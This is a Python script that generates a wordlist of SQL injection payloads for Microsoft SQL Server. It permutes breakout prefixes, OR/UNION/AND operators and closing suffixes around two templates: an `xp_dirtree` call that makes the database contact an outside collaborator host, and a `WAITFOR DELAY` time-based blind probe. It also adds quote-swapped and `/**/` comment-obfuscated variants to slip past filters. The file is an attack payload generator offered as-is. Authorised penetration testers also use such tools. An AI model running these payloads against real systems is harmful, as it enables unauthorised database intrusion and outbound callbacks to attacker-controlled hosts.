prefixes = [
    '',
    '; ',
    '" ',
    '") ',
    '")) ',
    '"))) ',
    ') ',
    ')) ',
    '))) '
]

sqlOperators = [
    '',
    'OR ',
    'UNION ',
    'AND '
]

suffixes = [
    '',
    '--',
    ' ("',
    ' (("',
    ' ((("',
    ' (',
    ' ((',
    ' ((('
]

templates = [
    'exec master..xp_dirtree "//{collaborator}/a"',
    'WAITFOR DELAY "0:0:{time}"'
]


def generate():
    wordlist = []

    for prefix in prefixes:
        for sqlOperator in sqlOperators:
            for template in templates:
                for suffix in suffixes:
                    word = prefix + sqlOperator + template + suffix
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))
                    word = word.replace(' ', '/**/')
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))

    return wordlist
